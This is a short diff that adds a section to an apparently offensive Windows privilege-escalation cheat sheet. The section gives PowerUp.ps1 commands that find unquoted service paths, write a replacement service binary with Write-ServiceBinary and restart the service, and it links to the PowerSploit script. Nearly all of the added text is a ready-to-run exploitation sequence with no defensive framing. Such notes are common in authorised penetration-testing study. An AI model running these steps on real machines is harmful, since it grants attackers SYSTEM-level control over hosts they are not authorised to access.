@@ -91,6 +91,24 @@ or
 shutdown /r
 ```
 
+-> Exploitation - PowerUp.ps1
+```powershell
+.\PowerUp.ps1
+```
+```powershell
+Invoke-AllChecks
+```
+```powershell
+Get-UnquotedService
+```
+```powershell
+Write-ServiceBinary -Name 'TestService' -Path "C:\Program Files\Enterprise Apps\TestService.exe"
+```
+```powershell
+Restart-Service TestService
+```
+- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+
 ### binPath - Services [PrivEsc]
 -> Detection
 ```powershell
